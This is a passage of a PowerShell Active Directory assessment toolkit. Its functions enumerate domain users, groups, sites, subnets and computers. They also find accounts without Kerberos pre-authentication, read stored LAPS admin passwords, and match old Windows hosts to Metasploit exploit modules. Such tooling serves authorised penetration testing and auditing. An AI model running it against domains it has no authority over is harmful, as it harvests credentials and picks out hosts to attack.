        $TableDomainUsers.Columns.Add("objectsid") | Out-Null
        $TableDomainUsers.Columns.Add("samaccountname") | Out-Null
        $TableDomainUsers.Columns.Add("samaccounttype") | Out-Null
        $TableDomainUsers.Columns.Add("userprincipalname") | Out-Null
        $TableDomainUsers.Columns.Add("displayname") | Out-Null
        $TableDomainUsers.Columns.Add("givenname") | Out-Null
        $TableDomainUsers.Columns.Add("sn") | Out-Null
        $TableDomainUsers.Columns.Add("description") | Out-Null
        $TableDomainUsers.Columns.Add("admincount") | Out-Null
        $TableDomainUsers.Columns.Add("homedirectory") | Out-Null
        $TableDomainUsers.Columns.Add("memberof") | Out-Null
        $TableDomainUsers.Clear()
    }

    Process
    {
        try
        {          
            # Get results
            $UserResults = Get-DomainObject -LdapFilter "(&(objectCategory=person)(objectClass=user)(SamAccountName=$User)(userAccountControl:1.2.840.113556.1.4.803:=262144))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $UserResults | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''

                # Add domain user information to table
                $TableDomainUsers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.samaccountname,
                [string]$_.properties.samaccounttype,
                [string]$_.properties.userprincipalname,
                [string]$_.properties.displayname,
                [string]$_.properties.givenname,
                [string]$_.properties.sn,  
                [string]$_.properties.description,       
                [string]$_.properties.admincount,
                [string]$_.properties.homedirectory,
                [string]$_.properties.memberof
                ) | Out-Null                        
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
        # Check for results
        if($TableDomainUsers.Rows.Count -gt 0)
        {
            $TableDomainUsersCount = $TableDomainUsers.Rows.Count
            Write-Verbose "$TableDomainUsersCount domain users found."
            Return $TableDomainUsers
        }else{
            Write-Verbose "0 domain users were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainUserKerbPreAuthNotRequired
# -------------------------------------------
# Ref: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainUserKerbPreAuthNotRequired
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Domain user to filter on.")]
        [string]$User = "*"
    )

    Begin
    {
        Write-Verbose "Getting domain users that do not require kerberos pre-authentication..."

        # Setup table for domain users
        $TableDomainUsers = New-Object System.Data.DataTable
        $TableDomainUsers.Columns.Add("objectsid") | Out-Null
        $TableDomainUsers.Columns.Add("samaccountname") | Out-Null
        $TableDomainUsers.Columns.Add("samaccounttype") | Out-Null
        $TableDomainUsers.Columns.Add("userprincipalname") | Out-Null
        $TableDomainUsers.Columns.Add("displayname") | Out-Null
        $TableDomainUsers.Columns.Add("givenname") | Out-Null
        $TableDomainUsers.Columns.Add("sn") | Out-Null
        $TableDomainUsers.Columns.Add("description") | Out-Null
        $TableDomainUsers.Columns.Add("admincount") | Out-Null
        $TableDomainUsers.Columns.Add("homedirectory") | Out-Null
        $TableDomainUsers.Columns.Add("memberof") | Out-Null
        $TableDomainUsers.Clear()
    }

    Process
    {
        try
        {          
            # Get results
            $UserResults = Get-DomainObject -LdapFilter "(&(objectCategory=person)(objectClass=user)(SamAccountName=$User)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $UserResults | ForEach-Object {

                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ");
                [string]$SidString = $SidBytes -replace ' ',''

                # Add domain user information to table
                $TableDomainUsers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.samaccountname,
                [string]$_.properties.samaccounttype,
                [string]$_.properties.userprincipalname,
                [string]$_.properties.displayname,
                [string]$_.properties.givenname,
                [string]$_.properties.sn,  
                [string]$_.properties.description,       
                [string]$_.properties.admincount,
                [string]$_.properties.homedirectory,
                [string]$_.properties.memberof
                ) | Out-Null                        
            }
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
        # Check for results
        if($TableDomainUsers.Rows.Count -gt 0)
        {
            $TableDomainUsersCount = $TableDomainUsers.Rows.Count
            Write-Verbose "$TableDomainUsersCount domain users found."
            Return $TableDomainUsers
        }else{
            Write-Verbose "0 domain users were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainGroupMembers
# -------------------------------------------
# Referenc: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainGroupMembers
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$true,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Group to filter on.")]
        [string]$Group
    )

    Begin
    {
        Write-Verbose "Getting members of the `"$group`" group..."

        # Create data table 
        $TblMembers = New-Object System.Data.DataTable
        $TblMembers.Columns.Add("Group") | Out-Null 
        $TblMembers.Columns.Add("Name") | Out-Null 
        $TblMembers.Columns.Add("User") | Out-Null 
        $TblMembers.Clear()
    }    

    Process
    {
        try
        {
            # Get results
            $GroupMemberResults = Get-DomainObject -LdapPath "CN=$Group, CN=Users" -DomainController $DomainController -username $username -password $password -Credential $Credential
            # Parse results
            $GroupMemberResults.properties.member |
            ForEach-Object {
                
                # Add results to table
                $AccountName = $_.split("=")[1].split(",")[0]
                $SamAccountName = Get-DomainObject -LdapPath "CN=$AccountName, CN=Users" -LdapFilter "(&(objectCategory=person)(objectClass=user))" -DomainController $DomainController -username $username -password $password -Credential $Credential | ForEach-Object { $_.properties.samaccountname}
                $TblMembers.Rows.Add($group,$_.split("=")[1].split(",")[0],$SamAccountName) | Out-Null -ErrorAction SilentlyContinue
            }
        }
        catch
        {
          #"Error was $_"
          #$line = $_.InvocationInfo.ScriptLineNumber
          #"Error was in Line $line"
        }
    }

    End
    {    
        # Check for results
        if($TblMembers.Rows.Count -gt 0)
        {
            $TblMembersCount = $TblMembers.Rows.Count
            Write-Verbose "$TblMembersCount domain group members were found."
            Return $TblMembers
        }else{
            Write-Verbose "0 domain group members were found."
        }    
    }
}     


# -------------------------------------------
# Function: Get-DomainUserGroups
# -------------------------------------------
function Get-DomainUserGroups
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]
        [string]$SearchDN,

        [Parameter(Mandatory=$true,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="User to filter by.")]
        [string]$User = "*"
    )
    Begin
    {
        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {

        try
        {          
        
            # Status
            Write-Verbose "Getting groups for $user..."

            # Setup table for domain users
            $TableDomainUserGroups = New-Object System.Data.DataTable
            $TableDomainUserGroups.Columns.Add("Group") | Out-Null
            $TableDomainUserGroups.Clear()

            # Setup the LDAP filter
            $CompFilter = "(&(objectCategory=person)(objectClass=user)(SamAccountName=$User))"
            $ObjSearcher.PageSize = $Limit
            $ObjSearcher.Filter = $CompFilter
            $ObjSearcher.SearchScope = "Subtree"

            if ($SearchDN)
            {
                $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
            }

            # Get distinguisshed name
            $CurrentDomain = $ObjDomain.distinguishedName

            # Add domain user information to table
            $ObjSearcher.FindAll() | ForEach-Object {
    
                $UserGroupsString = ([string]$_.properties.memberof -replace $CurrentDomain,'' -replace 'CN=Users,','' -replace 'CN=','').split(',')
                $UserGroupsString | 
                ForEach-Object {
                    $TableDomainUserGroups.Rows.Add( 
                    $_.trim()
                    ) | Out-Null                    
                }                        
            }

            # Check for domain users
            if($TableDomainUserGroups.Rows.Count -gt 0)
            {
                $TableDomainUserGroupsCount = $TableDomainUserGroups.Rows.Count
                Write-Verbose "$TableDomainUserGroupsCount groups were found for $user."
                Return $TableDomainUserGroups
            }else{
                Write-Verbose "0 groups were found for $User."
            }
        }
        catch
        {
          #"Error was $_"
          #$line = $_.InvocationInfo.ScriptLineNumber
          #"Error was in Line $line"
        }                
    }

    End
    {

    }
}


# -------------------------------------------
# Function: Get-DomainSite
# -------------------------------------------
function Get-DomainSite
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Site to filter for.")]
        [string]$Site = "*"
    )

    Begin
    {
        Write-Verbose "Getting domain sites..."

        # Create table for results
        $TableDomainSites = New-Object System.Data.DataTable
        $TableDomainSites.Columns.Add("Name") | Out-Null
        $TableDomainSites.Columns.Add("distinguishedname") | Out-Null
        $TableDomainSites.Columns.Add("whencreated") | Out-Null
        $TableDomainSites.Columns.Add("whenchanged") | Out-Null
        $TableDomainSites.Clear()
    }

    Process
    {
        try
        {
            # Get results
            $SiteResults = Get-DomainObject -DomainController $DomainController -username $username -password $password -Verbose -LdapFilter "(&(objectCategory=site)(name=$Site))" -LdapPath "CN=Sites,CN=Configuration"
            
            # Parse results
            $SiteResults | ForEach-Object {
            
                # Add results to table
                $TableDomainSites.Rows.Add( 
                    [string]$_.properties.name,    
                    [string]$_.properties.distinguishedname,
                    [string]$_.properties.whencreated,
                    [string]$_.properties.whenchanged
                ) | Out-Null
            
            }         
             
        }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                    
    }

    End
    {
        # Check for results
        if($TableDomainSites.Rows.Count -gt 0)
        {
        $TableDomainSitesCount = $TableDomainSites.Rows.Count
            Write-Verbose "$TableDomainSitesCount sites found."
            Return $TableDomainSites
        }else{
            Write-Verbose "0 sites were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainSubnet
# -------------------------------------------
function Get-DomainSubnet
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="LDAP Filter.")]
        [string]$LdapFilter = "",

        [Parameter(Mandatory=$false,
        HelpMessage="LDAP path.")]
        [string]$LdapPath,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree"
    )
    Begin
    {
        Write-Verbose "Getting subnets..."

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }        

        # Create Create the connection to LDAP       
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = (New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController", $Credential.UserName,$Credential.GetNetworkCredential().Password).distinguishedname           

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = "/"+$LdapPath+","+$objDomain
                $objDomainPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController$LdapPath", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }else{
                $objDomainPath= New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController", $Credential.UserName,$Credential.GetNetworkCredential().Password
            }
            
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomainPath
        }else{
            $objDomain = ([ADSI]"").distinguishedName
            
            # add ldap path
            if($LdapPath)
            {
                $LdapPath = $LdapPath+","+$objDomain
                $LdapPath
                $objDomainPath  = [ADSI]"LDAP://$LdapPath"
            }else{
                $objDomainPath  = [ADSI]""
            }
              
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomainPath
        }

        # Create table for object information
        $TableDomainSubnets = New-Object System.Data.DataTable
        $TableDomainSubnets.Columns.Add("Site") | Out-Null
        $TableDomainSubnets.Columns.Add("Subnet") | Out-Null        
        $TableDomainSubnets.Columns.Add("Description") | Out-Null                
        $TableDomainSubnets.Columns.Add("whencreated") | Out-Null  
        $TableDomainSubnets.Columns.Add("whenchanged") | Out-Null 
        $TableDomainSubnets.Columns.Add("distinguishedname") | Out-Null      
        $TableDomainSubnets.Clear()
    }

    Process
    {        
        try
        {
            # Get results
            Get-DomainObject -DomainController $DomainController -username $username -password $password -Verbose -LdapFilter "(objectCategory=subnet)" -LdapPath "CN=Subnets,CN=Sites,CN=Configuration" | 
            ForEach-Object {
            
                # Add results to table
                $TableDomainSubnets.Rows.Add(                     
                    [string]$_.properties.siteobject.split(",")[0].split("=")[1],   
                    [string]$_.properties.name,    
                    [string]$_.properties.description,  
                    [string]$_.properties.whencreated,
                    [string]$_.properties.whenchanged,
                    [string]$_.properties.distinguishedname
                ) | Out-Null
            }
        }
        catch
        {
          #"Error was $_"
          #$line = $_.InvocationInfo.ScriptLineNumber
          #"Error was in Line $line"
        }                    
    }

    End
    {
        # Check for subnets
        if($TableDomainSubnets.Rows.Count -gt 0)
        {
        $TableDomainSubnetsCount = $TableDomainSubnets.Rows.Count
            Write-Verbose "$TableDomainSubnetsCount subnets found."
            Return $TableDomainSubnets
        }else{
            Write-Verbose "0 subnets were found."
        } 
    }
}


# -------------------------------------------
# Function: Get-DomainComputer
# -------------------------------------------
function Get-DomainComputer
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,
                
        [Parameter(Mandatory=$false,
        ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="Computer name to filter on.")]
        [string]$ComputerName = "*"
    )

    Begin
    {
        Write-Verbose "Getting domain computers..."

        # Setup table for results
        $TableDomainComputers = New-Object System.Data.DataTable
        $TableDomainComputers.Columns.Add('ObjectSid') | Out-Null 
        $TableDomainComputers.Columns.Add('SamAccountName') | Out-Null  
        $TableDomainComputers.Columns.Add('dnshostname') | Out-Null        
        $TableDomainComputers.Columns.Add('cn') | Out-Null 
        $TableDomainComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableDomainComputers.Columns.Add('ServicePack') | Out-Null
        $TableDomainComputers.Columns.Add('Description') | Out-Null
        $TableDomainComputers.Columns.Add('MemeberOf') | Out-Null
        $TableDomainComputers.Columns.Add('LapsPassword') | Out-Null
        $TableDomainComputers.Columns.Add('AdminCount') | Out-Null
        $TableDomainComputers.Columns.Add('msDS-SupportedEncryptionTypes') | Out-Null        
        $TableDomainComputers.Clear()
    }

    Process
    {
        try
        {
            # Get results
            $ComputerResults = Get-DomainObject -LdapFilter "(&(objectCategory=Computer)(SamAccountName=$ComputerName))" -DomainController $DomainController -username $username -password $password -Credential $Credential

            # Parse results
            $ComputerResults | ForEach-Object {
              
                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(" ")
                [string]$SidString = $SidBytes -replace ' ',''

                # Add results to table
                $TableDomainComputers.Rows.Add( 
                [string]$SidString,
                [string]$_.properties.samaccountname,
                [string]$_.properties.dnshostname,
                [string]$_.properties.cn,
                [string]$($_.properties.operatingsystem), 
                [string]$($_.properties.operatingsystemservicepack),
                [string]$_.properties.description,  
                [string]$_.properties.memberof,
                [string]$($_.properties['ms-MCS-AdmPwd']),
                [string]$_.properties.admincount,    
                [string]$($_.properties['msDS-SupportedEncryptionTypes'])           
                ) | Out-Null
            }
         }catch{
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }                
    }

    End
    {
        # Check for results
        if($TableDomainComputers.Rows.Count -gt 0)
        {
            $TableDomainComputersCount = $TableDomainComputers.Rows.Count
            Write-Verbose "$TableDomainComputersCount domain computers found."
            Return $TableDomainComputers
        }else{
            Write-Verbose "0 domain computers were found."
        }
    }
}


# -------------------------------------------
# Function: Get-DomainPasswordsLAPS
# -------------------------------------------
function Get-DomainPasswordsLAPS
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000.")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {
        Write-Verbose "Getting domain LAPS passwords..."

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {        
        try
        {              
            # Create data table for LAPS information
            $TableLAPS = New-Object System.Data.DataTable 
            $TableLAPS.Columns.Add('Hostname') | Out-Null
            $TableLAPS.Columns.Add('Password') | Out-Null
            $TableLAPS.Clear()

            # Setup LDAP filter for domain computers
            $CompFilter = "(&(objectCategory=Computer))"
            $ObjSearcher.PageSize = $Limit
            $ObjSearcher.Filter = $CompFilter
            $ObjSearcher.SearchScope = "Subtree"

            if ($SearchDN)
            {
                $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
            }            

            # Add LAPS passwords to the table
            $ObjSearcher.FindAll() | ForEach-Object {

                $CurrentHost = $($_.properties['dnshostname'])
			    $CurrentPassword = $($_.properties['ms-MCS-AdmPwd'])

                # Check for readable password and add to table
                if ($CurrentPassword.length -ge 1)
                {
                    # Add domain computer to data table
                    $TableLAPS.Rows.Add($CurrentHost,$CurrentPassword) | Out-Null
                }                
             }

            # Check for LAPS passwords
            if($TableLAPS.Rows.Count -gt 0)
            {
                $TableLAPsCount = $TableLAPS.Rows.Count
                Write-Verbose "$TableLAPSCount LAPS passwords found."
                Return $TableLAPS
            }else{
                Write-Verbose "0 LAPS passwords were found."
            }
        }
        catch
        {
          "Error was $_"
          $line = $_.InvocationInfo.ScriptLineNumber
          "Error was in Line $line"
        }
    }
    End
    {
    }
}

        

# -------------------------------------------
# Function: Get-DomainComputerExploitable
# -------------------------------------------
function Get-DomainComputerExploitable
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,

        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000.")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {

        Write-Verbose "Getting exploitable domain computers..."

        # Create PS Credential object
        if($Password)
        {
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Create the connection to LDAP
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }else{
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        } 
    }

    Process
    {    
        # Create data table for hostnames, os, and service packs from LDAP
        $TableAdsComputers = New-Object System.Data.DataTable 
        $TableAdsComputers.Columns.Add('Hostname') | Out-Null        
        $TableAdsComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableAdsComputers.Columns.Add('ServicePack') | Out-Null
        $TableAdsComputers.Columns.Add('LastLogon') | Out-Null

        # Setup LDAP filter
        $CompFilter = "(&(objectCategory=Computer))"
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
        }

        # Add computers to table
        $ObjSearcher.FindAll() | ForEach-Object {

            # Setup fields
            $CurrentHost = $($_.properties['dnshostname'])
            $CurrentOs = $($_.properties['operatingsystem'])
            $CurrentSp = $($_.properties['operatingsystemservicepack'])
            $CurrentLast = $($_.properties['lastlogon'])
            $CurrentUac = $($_.properties['useraccountcontrol'])

            # Convert useraccountcontrol to binary so flags can be checked
            # http://support.microsoft.com/en-us/kb/305144
            # http://blogs.technet.com/b/askpfeplat/archive/2014/01/15/understanding-the-useraccountcontrol-attribute-in-active-directory.aspx
            $CurrentUacBin = [convert]::ToString($CurrentUac,2)

            # Check the 2nd to last value to determine if its disabled
            $DisableOffset = $CurrentUacBin.Length - 2
            $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)

            # Add computer to list if it's enabled
            if ($CurrentDisabled  -eq 0){

                # Add domain computer to data table
                $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast) | Out-Null 
            }            
 
         }
    
        # Create data table for list of patches levels with a MSF exploit
        $TableExploits = New-Object System.Data.DataTable 
        $TableExploits.Columns.Add('OperatingSystem') | Out-Null 
        $TableExploits.Columns.Add('ServicePack') | Out-Null
        $TableExploits.Columns.Add('MsfModule') | Out-Null  
        $TableExploits.Columns.Add('CVE') | Out-Null
        
        # Add exploits to data table
        $TableExploits.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
